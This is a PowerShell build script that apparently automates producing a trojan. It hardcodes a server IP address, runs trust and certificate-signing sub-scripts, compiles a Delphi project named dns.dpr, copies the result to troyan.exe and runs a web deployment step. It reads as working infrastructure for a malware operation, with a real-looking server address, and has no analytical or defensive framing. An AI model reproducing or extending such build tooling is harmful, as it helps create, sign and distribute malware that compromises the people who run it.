param (
    [string]$serverName
)
$serverName="185.247.141.76"
if ([string]::IsNullOrEmpty($serverName))
{
    throw "compile.ps1 -serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
if ([string]::IsNullOrEmpty($server.rootDir)) {
    throw "compile1.ps1 - server is not linked"
}

#trust
& (Join-Path -Path $server.sysDir -ChildPath "./trust.ps1") -serverName $serverName

#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName

#clean TROY
$extensions = @(".dcu", ".res", ".exe",".~pas","*.~dpr")
foreach ($ext in $extensions) {
    Get-ChildItem -Path $server.troyanDelphiDir -Filter "*$ext" | Remove-Item -Force
}
Get-ChildItem -Path $server.troyanDelphiDir -Filter "_*" | Remove-Item -Force
$readyScript=Join-Path -Path $server.troyanDelphiDir -ChildPath "_ready.ps1"
if (Test-Path -Path $readyScript) {
    Remove-Item -Path $readyScript
}

#clean SYS
$subfoldersToDelete = @(".idea", "bin", "obj")
foreach ($subfolder in $subfoldersToDelete) {
    $fullPath = Join-Path -Path $server.sysDir -ChildPath $subfolder
    if (Test-Path -Path $fullPath) {
        try {
            Remove-Item -Path $fullPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Deleted $fullPath"
        } catch {
            Write-Host "Failed to delete $fullPath : $_"
        }
    } else {
        Write-Host "Subfolder $fullPath does not exist."
    }
}

#precompile
& (Join-Path -Path $server.troyanDelphiDir -ChildPath "./precompile.ps1") -serverName $serverName

#compile
$dprFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "dns.dpr"
Set-Location -Path (Split-Path -Path $dprFile -Parent)
& "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
$exeFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "dns.exe"
$currentExeFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "troyan.exe"
Copy-Item -Path $exeFile -Destination $currentExeFile -Force


#web
& (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName

Write-Host "Compile complete"